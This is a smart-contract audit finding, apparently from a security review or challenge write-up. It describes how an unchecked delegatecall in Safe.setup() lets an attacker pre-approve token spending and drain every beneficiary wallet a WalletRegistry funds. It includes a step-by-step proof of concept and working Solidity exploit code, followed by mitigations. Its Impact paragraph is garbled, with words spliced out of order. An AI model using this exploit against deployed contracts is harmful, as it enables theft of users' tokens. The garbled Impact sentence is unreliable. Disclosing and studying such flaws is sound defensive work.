### [H-1] Safe setup() delegatecall executes arbitrary code before WalletRegistry validation

**Description:** `WalletRegistry.proxyCreated()` validates that a newly deployed 
Safe wallet has the correct owner, threshold, and no fallback manager — but never 
validates the `to` and `data` parameters passed to `Safe.setup()` during 
initialization. `Safe.setup()` accepts an optional `delegatecall` target (`to`) 
and payload (`data`) that executes in the wallet's own storage context before the 
registry's checks run. An attacker can deploy wallets on behalf of all beneficiaries 
in a single transaction, smuggling a malicious module call into `setup()` that 
pre-approves the attacker to spend the wallet's tokens — tokens the registry 
deposits immediately after its checks pass.

**Impact:** A all token rewards intended for every registered 
beneficiary in one transaction, win attacker can drainthout any beneficiary ever interacting with their 
wallet. All 40 tokens (4 × 10) can be redirected to an arbitrary recovery address.

**Proof of Concept:**
1. Deploy a `BackdoorModule` contract with an `approve()` function.
2. For each beneficiary, craft `Safe.setup()` calldata with:
   - `owners = [beneficiary]` — passes the registry's owner check
   - `threshold = 1` — passes the threshold check
   - `to = address(backdoorModule)` — delegatecall target
   - `data = approve(token, attacker)` — approves attacker to spend wallet tokens
   - `fallbackHandler = address(0)` — passes fallback manager check
3. Call `walletFactory.createProxyWithCallback()` for each beneficiary — registry 
   fires `proxyCreated()`, all checks pass, 10 tokens sent to wallet.
4. Call `token.transferFrom(wallet, recovery, 10e18)` — drains each wallet 
   immediately using the approval set during setup.

<details>
<summary>Example Code Snippet</summary>

```solidity
contract BackdoorModule {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

for (uint256 i = 0; i < users.length; i++) {
    address[] memory owners = new address[](1);
    owners[0] = users[i];

    bytes memory initializer = abi.encodeWithSelector(
        Safe.setup.selector,
        owners, 1,
        address(backdoorModule),
        abi.encodeWithSelector(BackdoorModule.approve.selector, address(token), address(this)),
        address(0), address(0), 0, address(0)
    );

    address proxy = address(walletFactory.createProxyWithCallback(
        address(singletonCopy), initializer, i,
        IProxyCreationCallback(address(walletRegistry))
    ));

    token.transferFrom(proxy, recovery, 10e18);
}
```
</details>

**Recommended Mitigation:**
1. Validate that `to == address(0)` and `data.length == 0` in the initializer 
   calldata inside `proxyCreated()` — reject any setup that includes an 
   arbitrary delegatecall target.
2. Alternatively, decode and validate the full `initializer` calldata parameters 
   rather than just checking the function selector.